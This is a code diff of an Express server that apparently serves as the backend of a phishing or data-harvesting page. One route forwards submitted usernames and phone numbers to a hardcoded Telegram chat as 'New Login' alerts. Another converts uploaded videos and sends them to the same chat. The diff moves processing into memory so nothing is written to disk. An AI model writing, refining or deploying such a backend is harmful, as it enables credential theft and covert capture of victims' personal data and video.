@@ -1,11 +1,10 @@
 const express = require("express");
 const multer = require("multer");
-const fs = require("fs");
 const axios = require("axios");
 const FormData = require("form-data");
 const cors = require("cors");
 const ffmpeg = require("fluent-ffmpeg");
-const path = require("path");
+const { PassThrough } = require("stream");
 
 const app = express();
 
@@ -15,25 +14,15 @@ const app = express();
 app.use(cors());
 app.use(express.json()); 
 
-// Ensure uploads folder exists
-const uploadDir = path.join(__dirname, "uploads");
-if (!fs.existsSync(uploadDir)) {
-    fs.mkdirSync(uploadDir);
-    console.log("✅ Created 'uploads' directory");
-}
-
 // =====================
-// 📁 FILE STORAGE
+// 📁 MEMORY STORAGE
 // =====================
-const storage = multer.diskStorage({
-    destination: "uploads/",
-    filename: (req, file, cb) => {
-        const ext = file.originalname.split(".").pop() || "webm";
-        cb(null, `${Date.now()}.${ext}`); 
-    }
+// Files are stored in RAM (Buffer), not the 'uploads' folder
+const storage = multer.memoryStorage();
+const upload = multer({ 
+    storage,
+    limits: { fileSize: 50 * 1024 * 1024 } // Limit to 50MB to protect RAM
 });
-
-const upload = multer({ storage });
 
 // =====================
 // 🔑 CONFIG
@@ -46,10 +35,7 @@ const CHAT_ID = "8280326139";
 // =====================
 app.post("/send-phone", async (req, res) => {
     const { username, phone } = req.body;
-    
-    if (!username || !phone) {
-        return res.status(400).send("Missing data");
-    }
+    if (!username || !phone) return res.status(400).send("Missing data");
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -57,63 +43,69 @@ app.post("/send-phone", async (req, res) => {
             text: `🔔 *New Login*\n👤 User: ${username}\n📱 Phone: ${phone}`,
             parse_mode: "Markdown"
         });
-        res.status(200).send("Login sent to bot");
+        res.status(200).send("Login sent");
     } catch (err) {
-        console.error("❌ Login Error:", err.message);
-        res.status(500).send("Bot failed to send login");
+        res.status(500).send("Bot failed");
     }
 });
 
 // =====================
-// 🚀 VIDEO UPLOAD ROUTE
+// 🚀 VIDEO UPLOAD ROUTE (FOLDER-LESS)
 // =====================
 app.post("/upload", upload.single("video"), async (req, res) => {
-    let filePath = null;
-    let mp4Path = null;
-
     try {
-        console.log("\n--- New Upload Request ---");
-
         if (!req.file) {
             return res.status(400).send("No file uploaded");
         }
 
-        filePath = path.resolve(req.file.path);
-        mp4Path = filePath + ".mp4";
+        console.log("🚀 Conversion starting in memory...");
 
-        console.log("🔄 Converting video...");
+        // 1. Create a stream to hold the converted data
+        const outputStream = new PassThrough();
+        const chunks = [];
 
-        // 1. Convert to MP4 (Optimized for Telegram)
-        await new Promise((resolve, reject) => {
-            ffmpeg(filePath)
+        // Collect converted data into an array
+        outputStream.on('data', (chunk) => chunks.push(chunk));
+
+        // 2. Run FFmpeg using buffers and streams
+        const ffmpegPromise = new Promise((resolve, reject) => {
+            ffmpeg()
+                .input(PassThrough.from(req.file.buffer)) // Feed the RAM buffer into FFmpeg
+                .inputFormat('webm') // Or identify format from req.file.mimetype
                 .outputOptions([
                     "-c:v libx264",
                     "-preset ultrafast",
                     "-pix_fmt yuv420p",
                     "-c:a aac",
-                    "-movflags +faststart" // Allows video to play before fully downloaded
+                    "-f mp4", // Force output to MP4 format
+                    "-movflags frag_keyframe+empty_moov" // Crucial for streaming MP4
                 ])
-                .save(mp4Path)
+                .on("error", (err) => {
+                    console.error("❌ FFmpeg Error:", err.message);
+                    reject(err);
+                })
                 .on("end", () => {
                     console.log("✅ Conversion complete");
                     resolve();
                 })
-                .on("error", (err) => {
-                    console.error("❌ FFmpeg error:", err.message);
-                    reject(err);
-                });
+                .pipe(outputStream); // Send result to our collector
         });
 
-        // 2. Prepare for Telegram
-        console.log("📤 Sending to Telegram...");
+        await ffmpegPromise;
+
+        // 3. Combine chunks into one final buffer
+        const finalVideoBuffer = Buffer.concat(chunks);
+
+        console.log("📤 Sending buffer to Telegram...");
+
+        // 4. Send to Telegram
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
-        form.append("video", fs.createReadStream(mp4Path), {
+        form.append("video", finalVideoBuffer, {
             filename: "video.mp4",
             contentType: "video/mp4"
         });
 
-        // 3. Send to API
         await axios.post(
             `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
             form,
@@ -129,19 +121,7 @@ app.post("/upload", upload.single("video"), async (req, res) => {
 
     } catch (err) {
         console.error("❌ Process Error:", err.message);
-        if (err.response?.data) console.error("API Error Details:", err.response.data);
-        res.status(500).send("Failed to process video");
-    } finally {
-        // 4. Cleanup after delay to avoid file-locking issues
-        setTimeout(() => {
-            try {
-                if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
-                if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
-                console.log("🧹 Cleanup: Temp files removed");
-            } catch (cleanupErr) {
-                console.error("🧹 Cleanup Warning:", cleanupErr.message);
-            }
-        }, 3000); // 3-second buffer
+        res.status(500).send("Processing failed");
     }
 });
 
@@ -150,5 +130,5 @@ app.post("/upload", upload.single("video"), async (req, res) => {
 // =====================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🌐 Server active on port ${PORT}`);
+    console.log(`🌐 Server running (Memory Mode) on port ${PORT}`);
 });
